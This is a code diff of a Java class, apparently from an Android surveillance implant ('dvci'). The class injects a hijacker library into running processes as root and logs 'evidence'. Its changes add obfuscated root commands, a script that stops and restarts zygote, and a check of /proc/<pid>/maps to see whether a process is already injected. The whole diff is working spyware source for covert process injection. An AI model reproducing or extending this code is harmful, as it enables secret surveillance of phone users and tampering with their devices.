@@ -5,6 +5,7 @@ import com.android.dvci.Root;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.evidence.EvidenceBuilder;
+import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
 import com.android.mm.M;
@@ -14,6 +15,8 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.concurrent.Semaphore;
 import java.util.concurrent.TimeUnit;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 
 /*
@@ -48,7 +51,7 @@ public class Instrument implements Runnable{
 		proc_owner = owner;
 		hijacker = String.valueOf(Math.abs((int)Utils.getRandom()))+"m";
 		libInAsset = library;
-		lib_dest = String.valueOf(Math.abs((int)Utils.getRandom()));
+		lib_dest = Markup.makeMarkupName(library, false);
 		path = filesPath.getAbsolutePath();
 		dumpPath = dump;
 		sync_semaphore = sem;
@@ -399,7 +402,15 @@ public class Instrument implements Runnable{
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (killProc) try to kill " + pid);
 			}
-			Execute.executeRoot("kill " + pid);
+			if (proc.equalsIgnoreCase(M.e("zygote"))){
+				String scriptName = String.valueOf(Math.abs((int)Utils.getRandom()))+"kk";
+				String script = M.e("#!/system/bin/sh") + "\n";
+				script += M.e("stop zygote") + "\n";
+				script += M.e("start zygote") + "\n";
+				Execute.executeRootAndForgetScript(script);
+			}else {
+				Execute.executeRoot(M.e("kill ") + pid);
+			}
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (killProc) Error: " + ex);
@@ -579,7 +590,16 @@ public class Instrument implements Runnable{
 		 * in case the process is killed while used?
 		 */
 		if(trialsBelowLimits()) {
-			stopInstrumentation();
+			if(alreadyInjected()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInjection):process already injected kill it first");
+				}
+				stopInstrumentation();
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInjection): no need to stop");
+				}
+			}
 			if (isStarted()) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(startInjection): hijacker already running");
@@ -602,6 +622,26 @@ public class Instrument implements Runnable{
 				Check.log(TAG + "(startInjection): hijacker cannot be installed too many trials");
 			}
 			EvidenceBuilder.info(M.e("injection " + proc +" cannot be installed,too many trials"));
+		}
+		return false;
+	}
+
+	private boolean alreadyInjected() {
+		int pid = getProcessPid(proc, proc_owner);
+		//read /proc/%pid/maps and checks for lib_dest process
+		Pattern pattern = Pattern.compile(lib_dest);
+		ExecuteResult ret = Execute.executeRoot(M.e("cat /proc/") + pid + "/" + M.e("maps "));
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (alreadyInjected) " + proc + " output: ");
+		}
+		for (String s : ret.stdout) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " " + s);
+			}
+			Matcher matcher = pattern.matcher(s);
+			if (matcher.find()) {
+				return true;
+			}
 		}
 		return false;
 	}
